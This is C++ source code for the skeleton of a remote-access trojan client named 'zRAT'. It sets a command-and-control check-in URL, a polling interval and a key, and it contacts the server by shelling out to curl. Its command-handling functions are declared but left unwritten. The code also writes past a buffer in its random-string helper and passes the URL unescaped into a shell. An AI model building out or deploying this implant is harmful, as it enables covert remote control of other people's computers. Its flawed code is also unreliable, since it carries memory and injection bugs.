#include <iostream>
#include <ctime>
#include <cstdlib>
#include <cstdio>
#include <unistd.h> //sleep()

using namespace std;

string surl = "http://localhost/zRAT/server/";   //上线地址
int times = 3000;           //请求周期 ms
string sid = "";
string key = "123456";
bool debug = true;

/**
* @brief get randon string
*/
string getSalt(int len = 100);

bool chkEnv();
bool reg();
string getCommand();
bool sendResult(string cid, int status, string data);
string getContent(string url);


int main()
{
    if(!chkEnv())
    {
        cout << "Failed to connect to server." << endl;
        return -1;
    }
    srand(time(NULL));
    sid = getSalt(123);
    if(debug)
    {
        cout << "sid:" << sid << endl;
    }

    return 0;
}

string getSalt(int len)
{
    int i;
    char str[len + 1];
    for(i=0;i<len;++i)
        str[i]='A'+rand()%26;
    str[++i]='\0';
    return str;
}

bool chkEnv()
{
    string str = getContent(surl + "auth.php");
    if(str.find("status") == string::npos)
        return false;
    return true;
}

bool reg()
{
    return true;
}

string getContent(string url)
{
    FILE *fp;
    char str[2000];
    string command = "curl --max-time 3 " + url;
    //cout << command << endl;
    if ((fp = popen(command.data(), "r")) == NULL)
        return "";
    if(fgets(str, sizeof(str) - 1, fp) == NULL)
        return "";
    if(debug)
    {
        cout << "\ngetContent:\t" + url + ":\t" + str << endl;
    }
    return str;
}
